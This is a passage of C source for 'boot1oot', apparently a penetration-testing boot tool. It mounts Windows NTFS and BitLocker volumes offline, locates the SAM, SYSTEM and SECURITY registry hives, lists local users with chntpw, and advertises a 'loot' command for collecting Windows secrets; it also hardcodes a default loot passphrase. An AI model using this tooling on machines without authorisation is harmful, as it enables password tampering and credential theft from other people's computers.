#define _GNU_SOURCE

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define MAX_DEVS 128
#define DEV_NAME_MAX 64
#define WIN_MOUNT_ROOT "/mnt/windows"
#define DISLOCKER_MOUNTPOINT "/run/boot1oot/dislocker"
#define LOOT_MOUNTPOINT "/loot"
#define LOOT_SENTINEL ".boot1oot-loot"
#define LOOT_PUBLIC_DIR "Users/Public/Boot1oot"
/* Change this before release builds; it only protects fallback archives from casual scanning. */
#define LOOT_DEFAULT_PASSPHRASE "boot1oot"
#define COLOR_RED "\033[31m"
#define COLOR_GREEN "\033[32m"
#define COLOR_BLUE "\033[34m"
#define COLOR_RESET "\033[0m"
#define BOOT1OOT_RECOVERY_KEY_ENV "BOOT1OOT_BITLOCKER_RECOVERY_KEY"
#define BOOT1OOT_LOOT_PASSPHRASE_ENV "BOOT1OOT_LOOT_PASSPHRASE"

#ifndef BOOT1OOT_BUILTIN_BITLOCKER_RECOVERY_KEY
#define BOOT1OOT_BUILTIN_BITLOCKER_RECOVERY_KEY ""
#endif

enum volume_kind {
	VOL_UNKNOWN = 0,
	VOL_NTFS,
	VOL_BITLOCKER,
};

enum fs_role {
	FS_ROLE_MOUNT_FAILED = -1,
	FS_ROLE_UNKNOWN = 0,
	FS_ROLE_WINDOWS_ROOT,
	FS_ROLE_WINDOWS_RECOVERY,
	FS_ROLE_WINDOWS_BOOT,
	FS_ROLE_WINDOWS_DATA,
};

enum mount_mode {
	MOUNT_READ_ONLY = 0,
	MOUNT_READ_WRITE,
};

struct candidate {
	char name[DEV_NAME_MAX];
	char path[DEV_NAME_MAX + 6];
	unsigned long long blocks;
	enum volume_kind kind;
};

static void print_success(const char *fmt, ...)
{
	va_list ap;

	fputs(COLOR_GREEN "[+] " COLOR_RESET, stdout);
	va_start(ap, fmt);
	vprintf(fmt, ap);
	va_end(ap);
	puts("");
}

static void print_fail(const char *fmt, ...)
{
	va_list ap;

	fputs(COLOR_RED "[!] " COLOR_RESET, stdout);
	va_start(ap, fmt);
	vprintf(fmt, ap);
	va_end(ap);
	puts("");
}

static void print_info(const char *fmt, ...)
{
	va_list ap;

	fputs(COLOR_BLUE "[*] " COLOR_RESET, stdout);
	va_start(ap, fmt);
	vprintf(fmt, ap);
	va_end(ap);
	puts("");
}

static const char *configured_recovery_key(void)
{
	const char *env_key = getenv(BOOT1OOT_RECOVERY_KEY_ENV);

	if (env_key && env_key[0])
		return env_key;

	if (BOOT1OOT_BUILTIN_BITLOCKER_RECOVERY_KEY[0])
		return BOOT1OOT_BUILTIN_BITLOCKER_RECOVERY_KEY;

	return NULL;
}

static const char *configured_loot_passphrase(void)
{
	const char *env_passphrase = getenv(BOOT1OOT_LOOT_PASSPHRASE_ENV);

	if (env_passphrase && env_passphrase[0])
		return env_passphrase;

	return LOOT_DEFAULT_PASSPHRASE;
}

static void print_banner(void)
{
	printf("\033[2J\033[H");
	puts("     .--------.");
	puts("    / .------. \\");
	puts("   | |        \\ \\");
	puts("   | |        | |");
	puts("  ____________| |_");
	puts(".'  x         |_| '.");
	puts("'._____ ____ _____.'");
	puts("|     .'____'.     |");
	puts("'.__.'.'    '.'.__.'");
	puts("'.__  boot1oot  __.'");
	puts("|   '.'.____.'.'   |");
	puts("'.____'.____.'____.'");
	puts("'.________________.'");
	puts("   - github.com/A3-N");
	puts("");
	puts("   Credits");
	puts("   +-----------+--------------------------------+");
	puts("   | tool      | source                         |");
	puts("   +-----------+--------------------------------+");
	puts("   | dislocker | github.com/Aorimn/dislocker    |");
	puts("   | chntpw    | pogostick.net/~pnh/ntpasswd    |");
	puts("   +-----------+--------------------------------+");
	puts("");
}

static void print_usage(FILE *out)
{
	fputs("usage: boot1oot <command> [options]\n"
	      "\n"
	      "commands:\n"
	      "  chntpw	list users, prompt, then launch upstream chntpw\n"
	      "  dislocker	[-r|-rw] unlock and mount all BitLocker Windows volumes\n"
	      "  mount    	[-r|-rw] scan and mount all Windows volumes\n"
	      "  scan     	list NTFS and BitLocker candidate volumes\n"
	      "  users    	export SAM user data with reged and show decoded users\n"
	      "  loot     	collect offline Windows secrets to USB loot or encrypted fallback\n"
	      "  unmount  	unmount Boot1oot Windows and dislocker mountpoints\n"
	      "  init     	show the OS banner and start the shell\n",
	      out);
}

static int ensure_dir(const char *path, mode_t mode)
{
	if (mkdir(path, mode) == 0 || errno == EEXIST)
		return 0;

	return -1;
}

static int mount_if_needed(const char *source, const char *target, const char *type,
			   unsigned long flags, const void *data)
{
	if (mount(source, target, type, flags, data) == 0 || errno == EBUSY)
		return 0;

	return -1;
}

static int ensure_runtime_filesystems(void)
{
	if (ensure_dir("/proc", 0555) != 0) {
		printf("init: cannot create /proc: %s\n", strerror(errno));
		return -1;
	}

	if (ensure_dir("/sys", 0555) != 0) {
		printf("init: cannot create /sys: %s\n", strerror(errno));
		return -1;
	}

	if (ensure_dir("/dev", 0755) != 0) {
		printf("init: cannot create /dev: %s\n", strerror(errno));
		return -1;
	}

	ensure_dir(LOOT_MOUNTPOINT, 0755);

	if (mount_if_needed("proc", "/proc", "proc", MS_NOSUID | MS_NOEXEC | MS_NODEV, NULL) != 0) {
		printf("init: cannot mount /proc: %s\n", strerror(errno));
		return -1;
	}

	if (mount_if_needed("sysfs", "/sys", "sysfs", MS_NOSUID | MS_NOEXEC | MS_NODEV, NULL) != 0)
		printf("init: warning: cannot mount /sys: %s\n", strerror(errno));

	if (mount_if_needed("devtmpfs", "/dev", "devtmpfs", MS_NOSUID, "mode=0755") != 0)
		printf("init: warning: cannot mount /dev: %s\n", strerror(errno));

	return 0;
}

static int ensure_parent_dirs(const char *path)
{
	char tmp[256];
	char *p;

	if (strlen(path) >= sizeof(tmp))
		return -1;

	snprintf(tmp, sizeof(tmp), "%s", path);
	for (p = tmp + 1; *p; p++) {
		if (*p != '/')
			continue;

		*p = '\0';
		if (ensure_dir(tmp, 0755) != 0)
			return -1;
		*p = '/';
	}

	return ensure_dir(tmp, 0755);
}

static int read_boot_oem_id(const char *dev, char oem[8])
{
	unsigned char sector[512];
	int fd;
	ssize_t got;

	fd = open(dev, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;

	got = pread(fd, sector, sizeof(sector), 0);
	close(fd);

	if (got < 11)
		return -1;

	memcpy(oem, sector + 3, 8);
	return 0;
}

static enum volume_kind probe_volume(const char *dev)
{
	char oem[8];

	if (read_boot_oem_id(dev, oem) != 0)
		return VOL_UNKNOWN;

	if (memcmp(oem, "NTFS    ", 8) == 0)
		return VOL_NTFS;

	if (memcmp(oem, "-FVE-FS-", 8) == 0)
		return VOL_BITLOCKER;

	return VOL_UNKNOWN;
}

static const char *volume_kind_name(enum volume_kind kind)
{
	switch (kind) {
	case VOL_NTFS:
		return "ntfs";
	case VOL_BITLOCKER:
		return "bitlocker";
	default:
		return "unknown";
	}
}

static int load_candidates(struct candidate *candidates, size_t max)
{
	FILE *fp;
	char line[256];
	size_t count = 0;

	fp = fopen("/proc/partitions", "r");
	if (!fp)
		return -1;

	while (fgets(line, sizeof(line), fp)) {
		unsigned int major;
		unsigned int minor;
		unsigned long long blocks;
		char name[DEV_NAME_MAX];
		struct candidate *cand;

		if (sscanf(line, " %u %u %llu %63s", &major, &minor, &blocks, name) != 4)
			continue;

		if (strncmp(name, "loop", 4) == 0 || strncmp(name, "ram", 3) == 0 ||
		    strncmp(name, "sr", 2) == 0)
			continue;

		if (count >= max)
			break;

		cand = &candidates[count];
		memset(cand, 0, sizeof(*cand));
		snprintf(cand->name, sizeof(cand->name), "%s", name);
		snprintf(cand->path, sizeof(cand->path), "/dev/%s", name);
		cand->blocks = blocks;
		cand->kind = probe_volume(cand->path);

		if (cand->kind != VOL_UNKNOWN)
			count++;
	}

	fclose(fp);
	return (int)count;
}

static int path_exists(const char *path)
{
	return access(path, F_OK) == 0;
}

static int path_exists_under(const char *mountpoint, const char *relative)
{
	char path[256];

	snprintf(path, sizeof(path), "%s/%s", mountpoint, relative);
	return path_exists(path);
}

static const char *fs_role_name(enum fs_role role)
{
	switch (role) {
	case FS_ROLE_WINDOWS_ROOT:
		return "windows-root";
	case FS_ROLE_WINDOWS_RECOVERY:
		return "windows-recovery";
	case FS_ROLE_WINDOWS_BOOT:
		return "windows-boot";
	case FS_ROLE_WINDOWS_DATA:
		return "windows-data";
	case FS_ROLE_UNKNOWN:
		return "unknown-ntfs";
	default:
		return "mount-failed";
	}
}

static const char *mount_mode_name(enum mount_mode mode)
{
	return mode == MOUNT_READ_WRITE ? "read-write" : "read-only";
}

static enum fs_role classify_mounted_ntfs(const char *mountpoint)
{
	int root_signals = 0;

	if (path_exists_under(mountpoint, "Windows/System32/config/SYSTEM") ||
	    path_exists_under(mountpoint, "WINDOWS/System32/config/SYSTEM") ||
	    path_exists_under(mountpoint, "windows/System32/config/SYSTEM"))
		root_signals++;

	if (path_exists_under(mountpoint, "Windows/System32/config/SOFTWARE") ||
	    path_exists_under(mountpoint, "WINDOWS/System32/config/SOFTWARE") ||
	    path_exists_under(mountpoint, "windows/System32/config/SOFTWARE"))
		root_signals++;

	if (path_exists_under(mountpoint, "Windows/System32/ntoskrnl.exe") ||
	    path_exists_under(mountpoint, "WINDOWS/System32/ntoskrnl.exe") ||
	    path_exists_under(mountpoint, "windows/System32/ntoskrnl.exe"))
		root_signals++;

	if (path_exists_under(mountpoint, "Program Files") ||
	    path_exists_under(mountpoint, "Program Files (x86)") ||
	    path_exists_under(mountpoint, "Users"))
		root_signals++;

	if (root_signals >= 2)
		return FS_ROLE_WINDOWS_ROOT;

	if (path_exists_under(mountpoint, "Recovery/WindowsRE/Winre.wim") ||
	    path_exists_under(mountpoint, "Recovery/WindowsRE/winre.wim") ||
	    path_exists_under(mountpoint, "Windows/System32/Recovery/Winre.wim") ||
	    path_exists_under(mountpoint, "sources/boot.wim"))
		return FS_ROLE_WINDOWS_RECOVERY;

	if (path_exists_under(mountpoint, "Boot/BCD") ||
	    path_exists_under(mountpoint, "bootmgr") ||
	    path_exists_under(mountpoint, "BOOTMGR"))
		return FS_ROLE_WINDOWS_BOOT;

	if (path_exists_under(mountpoint, "Users") ||
	    path_exists_under(mountpoint, "Program Files") ||
	    path_exists_under(mountpoint, "ProgramData"))
		return FS_ROLE_WINDOWS_DATA;

	return FS_ROLE_UNKNOWN;
}

static int try_mount_ntfs(const char *dev, const char *mountpoint, enum mount_mode mode)
{
	const unsigned long flags = (mode == MOUNT_READ_ONLY ? MS_RDONLY : 0) | MS_NOATIME;
	const struct {
		const char *label;
		const char *data;
	} attempts[] = {
		{ "plain", NULL },
		{ "forced", "force" },
	};
	size_t i;
	int last_errno = 0;

	for (i = 0; i < sizeof(attempts) / sizeof(attempts[0]); i++) {
		if (mount(dev, mountpoint, "ntfs3", flags, attempts[i].data) == 0)
			return 0;

		last_errno = errno;
		print_fail("mount: %s as ntfs3 %s %s failed: %s",
			   dev, attempts[i].label, mount_mode_name(mode), strerror(errno));
	}

	errno = last_errno ? last_errno : EINVAL;
	return -1;
}

static int try_mount_ntfs3g_file(const char *file, const char *mountpoint, enum mount_mode mode)
{
	const char *ro_options[] = { "ro", "ro,uid=0,gid=0,umask=022", NULL };
	const char *rw_options[] = { "rw", "rw,uid=0,gid=0,umask=022", NULL };
	const char **options = mode == MOUNT_READ_WRITE ? rw_options : ro_options;
	size_t i;
	int last_status = 1;

	for (i = 0; options[i]; i++) {
		pid_t pid = fork();
		int status;

		if (pid < 0) {
			print_fail("ntfs-3g: fork failed: %s", strerror(errno));
			return -1;
		}

		if (pid == 0) {
			execl("/usr/bin/ntfs-3g", "ntfs-3g",
			      "-o", options[i], file, mountpoint, (char *)NULL);
			execl("/bin/ntfs-3g", "ntfs-3g",
			      "-o", options[i], file, mountpoint, (char *)NULL);
			execlp("ntfs-3g", "ntfs-3g",
			       "-o", options[i], file, mountpoint, (char *)NULL);
			fprintf(stderr, "ntfs-3g: cannot exec ntfs-3g: %s\n", strerror(errno));
			_exit(127);
		}

		if (waitpid(pid, &status, 0) < 0) {
			print_fail("ntfs-3g: wait failed: %s", strerror(errno));
			return -1;
		}

		if (WIFEXITED(status) && WEXITSTATUS(status) == 0)
			return 0;

		if (WIFEXITED(status))
			last_status = WEXITSTATUS(status);

		if (WIFEXITED(status))
			print_fail("ntfs-3g: %s with options '%s' failed with exit code %d",
				   file, options[i], WEXITSTATUS(status));
		else
			print_fail("ntfs-3g: %s with options '%s' failed", file, options[i]);
	}

	errno = EIO;
	return -last_status;
}

static void candidate_mountpoint(const struct candidate *cand, char *out, size_t out_len)
{
	snprintf(out, out_len, "%s/%s", WIN_MOUNT_ROOT, cand->name);
}

static void candidate_dislocker_mountpoint(const struct candidate *cand, char *out, size_t out_len)
{
	snprintf(out, out_len, "%s/%s", DISLOCKER_MOUNTPOINT, cand->name);
}

static int run_dislocker_fuse(const char *dev, const char *dislocker_mountpoint, enum mount_mode mode)
{
	const char *recovery_key = configured_recovery_key();
	char recovery_arg[128];
	char *args[12];
	pid_t pid;
	int status;

	if (ensure_parent_dirs(dislocker_mountpoint) != 0) {
		print_fail("dislocker: cannot create %s: %s", dislocker_mountpoint, strerror(errno));
		return 1;
	}

	pid = fork();
	if (pid < 0) {
		print_fail("dislocker: fork failed: %s", strerror(errno));
		return 1;
	}

	if (pid == 0) {
		int argc = 0;

		args[argc++] = "dislocker-fuse";
		if (mode == MOUNT_READ_ONLY)
			args[argc++] = "-r";
		args[argc++] = "-v";
		args[argc++] = "-V";
		args[argc++] = (char *)dev;
		if (recovery_key) {
			snprintf(recovery_arg, sizeof(recovery_arg), "--recovery-password=%s", recovery_key);
			args[argc++] = recovery_arg;
		} else {
			args[argc++] = "-p";
		}
		args[argc++] = "--";
		args[argc++] = (char *)dislocker_mountpoint;
		args[argc] = NULL;

		execv("/usr/sbin/dislocker-fuse", args);
		execvp("dislocker-fuse", args);
		fprintf(stderr, "dislocker: cannot exec dislocker-fuse: %s\n", strerror(errno));
		_exit(127);
	}

	if (waitpid(pid, &status, 0) < 0) {
		print_fail("dislocker: wait failed: %s", strerror(errno));
		return 1;
	}

	if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
		if (WIFEXITED(status))
			print_fail("dislocker: dislocker-fuse failed with exit code %d", WEXITSTATUS(status));
		else
			print_fail("dislocker: dislocker-fuse failed");
		return 1;
	}

	return 0;
}

static void print_dislocker_metadata(const char *dev)
{
	pid_t pid;
	int status;

	pid = fork();
	if (pid < 0) {
		print_fail("dislocker: metadata fork failed: %s", strerror(errno));
		return;
	}

	if (pid == 0) {
		execl("/usr/sbin/dislocker-metadata", "dislocker-metadata",
		      "-V", dev, (char *)NULL);
		execlp("dislocker-metadata", "dislocker-metadata",
		       "-V", dev, (char *)NULL);
		_exit(127);
	}

	if (waitpid(pid, &status, 0) < 0) {
		print_fail("dislocker: metadata wait failed: %s", strerror(errno));
		return;
	}

	if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
		print_fail("dislocker: metadata unavailable for %s", dev);
}

static int run_sbin_program(char *const argv[])
{
	pid_t pid;
	int status;

	pid = fork();
	if (pid < 0) {
		print_fail("%s: fork failed: %s", argv[0], strerror(errno));
		return 127;
	}

	if (pid == 0) {
		char path[128];

		snprintf(path, sizeof(path), "/usr/sbin/%s", argv[0]);
		execv(path, argv);
		execvp(argv[0], argv);
		fprintf(stderr, "%s: cannot exec: %s\n", argv[0], strerror(errno));
		_exit(127);
	}

	if (waitpid(pid, &status, 0) < 0) {
		print_fail("%s: wait failed: %s", argv[0], strerror(errno));
		return 127;
	}

	if (!WIFEXITED(status))
		return 127;

	return WEXITSTATUS(status);
}

static int run_program(char *const argv[])
{
	pid_t pid;
	int status;

	pid = fork();
	if (pid < 0) {
		print_fail("%s: fork failed: %s", argv[0], strerror(errno));
		return 127;
	}

	if (pid == 0) {
		execvp(argv[0], argv);
		fprintf(stderr, "%s: cannot exec: %s\n", argv[0], strerror(errno));
		_exit(127);
	}

	if (waitpid(pid, &status, 0) < 0) {
		print_fail("%s: wait failed: %s", argv[0], strerror(errno));
		return 127;
	}

	if (!WIFEXITED(status))
		return 127;

	return WEXITSTATUS(status);
}

static void print_scan_summary(const struct candidate *candidates, int count)
{
	int ntfs = 0;
	int bitlocker = 0;
	int i;

	for (i = 0; i < count; i++) {
		if (candidates[i].kind == VOL_NTFS)
			ntfs++;
		else if (candidates[i].kind == VOL_BITLOCKER)
			bitlocker++;
	}

	print_info("scan: %d candidate filesystem(s): %d NTFS, %d BitLocker",
		   count, ntfs, bitlocker);

	for (i = 0; i < count; i++) {
		const char *kind = "unknown";

		if (candidates[i].kind == VOL_NTFS)
			kind = "ntfs";
		else if (candidates[i].kind == VOL_BITLOCKER)
			kind = "bitlocker";

		print_info("scan: %-10s %-16s %llu KiB",
			   kind, candidates[i].path, candidates[i].blocks);
	}
}

static int scan_only(void)
{
	struct candidate candidates[MAX_DEVS];
	int count;

	if (ensure_runtime_filesystems() != 0) {
		print_fail("scan failed: runtime filesystem setup failed");
		return 1;
	}

	count = load_candidates(candidates, MAX_DEVS);
	if (count < 0) {
		print_fail("scan failed: cannot read /proc/partitions: %s", strerror(errno));
		return 1;
	}

	print_scan_summary(candidates, count);
	return count > 0 ? 0 : 1;
}

static int mount_ntfs_candidate(const struct candidate *cand, enum mount_mode mode)
{
	char mountpoint[128];
	enum fs_role role;

	candidate_mountpoint(cand, mountpoint, sizeof(mountpoint));

	if (ensure_parent_dirs(mountpoint) != 0) {
		print_fail("mount failed: cannot create %s: %s", mountpoint, strerror(errno));
		return FS_ROLE_MOUNT_FAILED;
	}

	print_info("ntfs: %s -> %s [%s]", cand->path, mountpoint, mount_mode_name(mode));

	if (try_mount_ntfs(cand->path, mountpoint, mode) != 0) {
		print_fail("mount: %s final %s failure: %s",
			   cand->path, mount_mode_name(mode), strerror(errno));
		print_fail("mount failed: %s", cand->path);
		return FS_ROLE_MOUNT_FAILED;
	}

	role = classify_mounted_ntfs(mountpoint);
	print_success("mount success: %s mounted %s at %s [%s]",
		      cand->path, mount_mode_name(mode), mountpoint, fs_role_name(role));

	return role;
}

static int mount_bitlocker_candidate(const struct candidate *cand, enum mount_mode mode)
{
	char dislocker_mountpoint[128];
	char dislocker_file[160];
	char mountpoint[128];
	enum fs_role role;

	candidate_dislocker_mountpoint(cand, dislocker_mountpoint, sizeof(dislocker_mountpoint));
	snprintf(dislocker_file, sizeof(dislocker_file), "%s/dislocker-file", dislocker_mountpoint);
	candidate_mountpoint(cand, mountpoint, sizeof(mountpoint));

	print_info("bitlocker: %s -> %s [%s]", cand->path, mountpoint, mount_mode_name(mode));
	print_info("dislocker: metadata check follows");
	print_dislocker_metadata(cand->path);

	if (configured_recovery_key())
		print_info("dislocker: using configured BitLocker recovery key");
	else
		print_info("dislocker: enter the BitLocker recovery password when prompted");

	if (run_dislocker_fuse(cand->path, dislocker_mountpoint, mode) != 0) {
		print_fail("mount failed: dislocker could not unlock %s", cand->path);
		return FS_ROLE_MOUNT_FAILED;
	}

	if (!path_exists(dislocker_file)) {
		print_fail("mount failed: %s was not created", dislocker_file);
		return FS_ROLE_MOUNT_FAILED;
	}

	{
		enum volume_kind decrypted_kind = probe_volume(dislocker_file);

		print_info("dislocker: decrypted virtual volume signature: %s",
			   volume_kind_name(decrypted_kind));
		if (decrypted_kind != VOL_NTFS) {
			print_fail("mount failed: decrypted BitLocker output is not an NTFS volume");
			return FS_ROLE_MOUNT_FAILED;
		}
	}

	if (ensure_parent_dirs(mountpoint) != 0) {
		print_fail("mount failed: cannot create %s: %s", mountpoint, strerror(errno));
		return FS_ROLE_MOUNT_FAILED;
	}

	if (try_mount_ntfs3g_file(dislocker_file, mountpoint, mode) != 0) {
		print_fail("mount: %s final ntfs-3g failure: %s", dislocker_file, strerror(errno));
		print_fail("mount failed: could not mount decrypted NTFS volume from %s", cand->path);
		return FS_ROLE_MOUNT_FAILED;
	}

	role = classify_mounted_ntfs(mountpoint);
	print_success("mount success: %s unlocked and mounted %s at %s [%s]",
		      cand->path, mount_mode_name(mode), mountpoint, fs_role_name(role));

	return role;
}

static int run_dislocker_mount(enum mount_mode mode)
{
	struct candidate candidates[MAX_DEVS];
	int count;
	int attempted = 0;
	int mounted = 0;
	int windows_roots = 0;
	int i;

	if (ensure_runtime_filesystems() != 0) {
		print_fail("mount failed: runtime filesystem setup failed");
		return 1;
	}

	if (ensure_dir("/mnt", 0755) != 0 || ensure_dir(WIN_MOUNT_ROOT, 0755) != 0) {
		print_fail("mount failed: cannot create %s: %s", WIN_MOUNT_ROOT, strerror(errno));
		return 1;
	}

	count = load_candidates(candidates, MAX_DEVS);
	if (count < 0) {
		print_fail("mount failed: cannot read /proc/partitions: %s", strerror(errno));
		return 1;
	}

	print_scan_summary(candidates, count);
	print_info("mount mode: %s", mount_mode_name(mode));

	for (i = 0; i < count; i++) {
		if (candidates[i].kind != VOL_BITLOCKER)
			continue;

		attempted++;
		switch (mount_bitlocker_candidate(&candidates[i], mode)) {
		case FS_ROLE_WINDOWS_ROOT:
			windows_roots++;
			mounted++;
			break;
		case FS_ROLE_MOUNT_FAILED:
			break;
		default:
			mounted++;
			break;
		}
	}

	if (windows_roots > 0)
		return 0;

	if (attempted == 0)
		print_fail("mount failed: no BitLocker volume detected");
	else if (mounted > 0)
		print_fail("mount failed: BitLocker volumes mounted, but none classified as Windows root");
	else
		print_fail("mount failed: no BitLocker volume mounted");

	return 1;
}

static int scan_and_mount_windows(enum mount_mode mode)
{
	struct candidate candidates[MAX_DEVS];
	int count;
	int attempted = 0;
	int mounted = 0;
	int windows_roots = 0;
	int i;

	if (ensure_runtime_filesystems() != 0) {
		print_fail("mount failed: runtime filesystem setup failed");
		return 1;
	}

	if (ensure_dir("/mnt", 0755) != 0 || ensure_dir(WIN_MOUNT_ROOT, 0755) != 0) {
		print_fail("mount failed: cannot create %s: %s", WIN_MOUNT_ROOT, strerror(errno));
		return 1;
	}

	count = load_candidates(candidates, MAX_DEVS);
	if (count < 0) {
		print_fail("mount failed: cannot read /proc/partitions: %s", strerror(errno));
		return 1;
	}

	print_scan_summary(candidates, count);
	print_info("mount mode: %s", mount_mode_name(mode));

	for (i = 0; i < count; i++) {
		if (candidates[i].kind != VOL_NTFS)
			continue;

		attempted++;
		switch (mount_ntfs_candidate(&candidates[i], mode)) {
		case FS_ROLE_WINDOWS_ROOT:
			windows_roots++;
			mounted++;
			break;
		case FS_ROLE_MOUNT_FAILED:
			break;
		default:
			mounted++;
			break;
		}
	}

	for (i = 0; i < count; i++) {
		if (candidates[i].kind != VOL_BITLOCKER)
			continue;

		attempted++;
		switch (mount_bitlocker_candidate(&candidates[i], mode)) {
		case FS_ROLE_WINDOWS_ROOT:
			windows_roots++;
			mounted++;
			break;
		case FS_ROLE_MOUNT_FAILED:
			break;
		default:
			mounted++;
			break;
		}
	}

	if (windows_roots > 0)
		return 0;

	if (attempted == 0)
		print_fail("mount failed: no NTFS or BitLocker volume detected");
	else if (mounted > 0)
		print_fail("mount failed: volumes mounted, but none classified as Windows root");
	else
		print_fail("mount failed: no Windows filesystem mounted");

	return 1;
}

static int find_windows_config_hive(const char *mountpoint, const char *hive,
				    char *out, size_t out_len)
{
	const char *lower = NULL;
	const char *dirs[] = {
		"Windows/System32/config",
		"WINDOWS/System32/config",
		"WINDOWS/system32/config",
		"windows/System32/config",
		"windows/system32/config",
		NULL,
	};
	size_t i;

	if (strcmp(hive, "SAM") == 0)
		lower = "sam";
	else if (strcmp(hive, "SYSTEM") == 0)
		lower = "system";
	else if (strcmp(hive, "SECURITY") == 0)
		lower = "security";

	for (i = 0; dirs[i]; i++) {
		char path[256];

		snprintf(path, sizeof(path), "%s/%s/%s", mountpoint, dirs[i], hive);
		if (path_exists(path)) {
			snprintf(out, out_len, "%s", path);
			return 0;
		}

		if (!lower)
			continue;

		snprintf(path, sizeof(path), "%s/%s/%s", mountpoint, dirs[i], lower);
		if (path_exists(path)) {
			snprintf(out, out_len, "%s", path);
			return 0;
		}
	}

	return -1;
}

static int find_mounted_windows_root(char *mountpoint, size_t mountpoint_len)
{
	DIR *dir;
	struct dirent *entry;
	int roots = 0;

	dir = opendir(WIN_MOUNT_ROOT);
	if (!dir) {
		if (errno == ENOENT)
			return 2;

		print_fail("chntpw failed: cannot open %s: %s", WIN_MOUNT_ROOT, strerror(errno));
		return 1;
	}

	while ((entry = readdir(dir)) != NULL) {
		char candidate[256];
		struct stat st;

		if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
			continue;

		snprintf(candidate, sizeof(candidate), "%s/%s", WIN_MOUNT_ROOT, entry->d_name);
		if (stat(candidate, &st) != 0 || !S_ISDIR(st.st_mode))
			continue;

		if (classify_mounted_ntfs(candidate) != FS_ROLE_WINDOWS_ROOT)
			continue;

		if (roots == 0)
			snprintf(mountpoint, mountpoint_len, "%s", candidate);
		roots++;
	}

	closedir(dir);

	if (roots == 0)
		return 2;

	if (roots > 1)
		print_info("chntpw: %d Windows roots mounted; using %s", roots, mountpoint);

	return 0;
}

static int ensure_chntpw_root(char *mountpoint, size_t mountpoint_len, enum mount_mode mount_mode)
{
	int rc;

	print_info("chntpw: looking for mounted Windows root filesystems");
	rc = find_mounted_windows_root(mountpoint, mountpoint_len);
	if (rc == 2) {
		print_info("chntpw: no mounted Windows root found; attempting automatic %s mount",
			   mount_mode_name(mount_mode));
		if (scan_and_mount_windows(mount_mode) != 0)
			return 1;
		rc = find_mounted_windows_root(mountpoint, mountpoint_len);
	}
	if (rc != 0)
		return 1;

	print_info("chntpw: selected Windows root %s", mountpoint);
	return 0;
}

static int ensure_chntpw_hives(char *mountpoint, size_t mountpoint_len,
			       enum mount_mode mount_mode,
			       char *sam_path, size_t sam_len,
			       char *system_path, size_t system_len,
			       char *security_path, size_t security_len)
{
	if (ensure_chntpw_root(mountpoint, mountpoint_len, mount_mode) != 0)
		return 1;

	if (find_windows_config_hive(mountpoint, "SAM", sam_path, sam_len) != 0) {
		print_fail("chntpw failed: SAM hive not found under %s", mountpoint);
		return 1;
	}

	if (find_windows_config_hive(mountpoint, "SYSTEM", system_path, system_len) != 0) {
		print_fail("chntpw failed: SYSTEM hive not found under %s", mountpoint);
		return 1;
	}

	if (find_windows_config_hive(mountpoint, "SECURITY", security_path, security_len) != 0) {
		print_fail("chntpw failed: SECURITY hive not found under %s", mountpoint);
		return 1;
	}

	print_info("chntpw: SAM      %s", sam_path);
	print_info("chntpw: SYSTEM   %s", system_path);
	print_info("chntpw: SECURITY %s", security_path);
	return 0;
}

static int ensure_chntpw_sam(char *mountpoint, size_t mountpoint_len,
			     enum mount_mode mount_mode,
			     char *sam_path, size_t sam_len)
{
	if (ensure_chntpw_root(mountpoint, mountpoint_len, mount_mode) != 0)
		return 1;

	if (find_windows_config_hive(mountpoint, "SAM", sam_path, sam_len) != 0) {
		print_fail("chntpw failed: SAM hive not found under %s", mountpoint);
		return 1;
	}

	print_info("chntpw: SAM %s", sam_path);
	return 0;
}

static int ensure_file_writable(const char *path)
{
	int fd;

	fd = open(path, O_RDWR | O_CLOEXEC);
	if (fd < 0)
		return -1;

	close(fd);
	return 0;
}

static int run_chntpw_list(enum mount_mode mount_mode)
{
	char mountpoint[256];
	char sam_path[256];
	char *const argv[] = {
		"chntpw",
		"-l",
		sam_path,
		NULL,
	};

	if (ensure_chntpw_sam(mountpoint, sizeof(mountpoint), mount_mode,
			      sam_path, sizeof(sam_path)) != 0)
		return 1;

	print_info("chntpw: listing local SAM users");
	return run_sbin_program(argv);
}

static int run_reged_export(const char *hive_path, const char *prefix,
			    const char *key, const char *output_path)
{
	char *const argv[] = {
		"reged",
		"-x",
		(char *)hive_path,
		(char *)prefix,
		(char *)key,
		(char *)output_path,
		NULL,
	};

	unlink(output_path);
	print_info("reged: export %s %s -> %s", prefix, key, output_path);
	return run_sbin_program(argv);
}

static int ensure_file_parent_dirs(const char *path)
{
	char tmp[512];
	char *slash;

	if (strlen(path) >= sizeof(tmp))
		return -1;

	snprintf(tmp, sizeof(tmp), "%s", path);
	slash = strrchr(tmp, '/');
	if (!slash || slash == tmp)
		return 0;

	*slash = '\0';
	return ensure_parent_dirs(tmp);
}

static int copy_file(const char *src, const char *dst)
{
	char buf[16384];
	int in_fd;
	int out_fd;
	ssize_t got;
	int rc = 0;

	in_fd = open(src, O_RDONLY | O_CLOEXEC);
	if (in_fd < 0) {
		print_fail("copy failed: cannot open %s: %s", src, strerror(errno));
		return -1;
	}

	if (ensure_file_parent_dirs(dst) != 0) {
		print_fail("copy failed: cannot create parent directory for %s: %s",
			   dst, strerror(errno));
		close(in_fd);
		return -1;
	}

	unlink(dst);
	out_fd = open(dst, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
	if (out_fd < 0) {
		print_fail("copy failed: cannot create %s: %s", dst, strerror(errno));
		close(in_fd);
		return -1;
	}

	while ((got = read(in_fd, buf, sizeof(buf))) > 0) {
		ssize_t written = 0;

		while (written < got) {
			ssize_t put = write(out_fd, buf + written, (size_t)(got - written));

			if (put < 0) {
				print_fail("copy failed: cannot write %s: %s", dst, strerror(errno));
				rc = -1;
				goto out;
			}
			if (put == 0) {
				print_fail("copy failed: short write to %s", dst);
				rc = -1;
				goto out;
			}
			written += put;
		}
	}

	if (got < 0) {
		print_fail("copy failed: cannot read %s: %s", src, strerror(errno));
		rc = -1;
	}

out:
	close(out_fd);
	close(in_fd);
	return rc;
}

static int run_chntpw_users(void)
{
	char mountpoint[256];
	char sam_path[256];
